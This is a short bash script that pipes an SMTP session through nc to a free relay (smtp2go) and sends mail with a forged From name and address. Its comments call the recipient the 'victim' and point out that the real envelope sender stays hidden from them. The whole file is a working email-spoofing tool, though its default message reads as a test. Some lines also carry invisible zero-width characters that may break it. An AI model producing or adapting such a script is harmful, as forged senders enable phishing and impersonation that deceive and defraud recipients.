
#!/bin/bash
# Mail Server Config
mail_server_ip=​"​mail.smtp2go.com​"                           # Use free plan SMTP service on smtp2go.com
mail_server_port="2525"
mail_server_username=""                                     # SMTP username
mail_server_password=""                                     # SMTP password
mail_server_legit_email=​"​noreply@smtp2go.com​"               # The `from` value of SMTP Envelope (not what victim see)
# Email params config
email_recipient=""                                          # Victims email
email_sender_email=""                                       # Spoofed sender email
email_sender_name=""                                        # Spoofed sender name
email_subject="Email Spoofing Test"                         # Message subject
email_body="This is just a test message, please ignore"     # Message content
# Start SMTP and send the email
nc ${mail_server_ip} ${mail_server_port} << EOF
ehlo
auth login
$(printf "$mail_server_username" | base64)
$(printf "$mail_server_password" | base64)
mail from:​${mail_server_legit_email}
rcpt to:${email_recipient}
data
From:​${email_sender_name}​<​${email_sender_email}​>
To:${email_recipient}
subject:${email_subject}
${email_body}
.
quit
EOF
